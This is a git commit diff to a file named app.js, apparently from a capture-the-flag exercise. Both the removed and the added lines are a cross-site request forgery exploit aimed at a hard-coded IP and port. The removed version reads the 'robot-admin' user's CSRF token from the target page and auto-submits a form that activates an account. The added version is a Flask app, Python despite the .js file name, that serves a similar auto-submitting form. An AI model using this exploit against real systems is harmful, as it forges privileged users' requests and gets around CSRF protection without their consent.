8c2b0e4469047755ef927a986c09bd85f6774c0d
Xurr1C4n3-byte <xurr1C4n3@gmail.com>
2025-07-12 06:48:56 -0400

    Update app.js

--- app.js
+++ app.js
@@ -1,16 +1,16 @@
-<form name="csrf" action="http://34.134.162.213:17001/" method="post" enctype="multipart/form-data">
-    <input type="hidden" name="username" value="exp" />  <!-- Activate account, modify according to actual needs -->
-    <input type="hidden" name="status" value="on" />  <!-- Activation action -->
-    <input type="hidden" name="csrf_token" id="csrfTokenField" value=""></form>
+from flask import Flask, render_template_string
 
-<script>
-    // Use robot-admin's identity to get robot-admin's token to bypass CSRF validation
-    var request = new XMLHttpRequest();
-    request.open("GET", decodeURIComponent("http://34.134.162.213:17001/"), false);
-    request.send(null);
-    var response = request.responseText;
-    var groups = response.match("csrf_token\" value=\"(.*?)\"");
-    var token = groups[1];
-    document.getElementById("csrfTokenField").value = token;  // Replace with robot-admin's token
-    document.csrf.submit();
-</script>
+app = Flask(__name__)
+
+@app.route("/")
+def index():
+    return """
+    <form name="csrf" action="http://34.134.162.213:17001/" method="post">
+        <input type="hidden" name="username" value="exp" />
+        <input type="hidden" name="status" value="on" />
+        <input type="hidden" name="csrf_token" value="" />
+    </form>
+    <script>
+        document.csrf.submit();
+    </script>
+    """
